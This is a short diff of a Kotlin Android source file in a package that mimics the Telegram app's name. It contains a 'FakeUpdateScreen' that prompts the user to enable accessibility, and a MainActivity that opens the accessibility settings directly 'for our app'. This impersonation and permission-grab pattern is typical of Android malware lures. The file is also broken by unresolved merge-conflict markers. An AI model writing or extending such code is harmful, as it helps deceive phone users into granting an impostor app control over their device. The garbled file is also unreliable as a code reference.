@@ -1,6 +1,7 @@
 package com.telegram2.messaging
 
 import android.content.Intent
+<<<<<<< HEAD
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
@@ -75,5 +76,18 @@ fun FakeUpdateScreen(onEnableAccessibility: () -> Unit, onProceed: () -> Unit) {
         Button(onClick = onProceed) {
             Text("Continue")
         }
+=======
+import android.os.Bundle
+import android.provider.Settings
+import androidx.activity.ComponentActivity
+
+class MainActivity : ComponentActivity() {
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        // Go directly to accessibility settings for our app
+        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+        startActivity(intent)
+        finish()
+>>>>>>> 0ad8761 (Update Wq project)
     }
 }
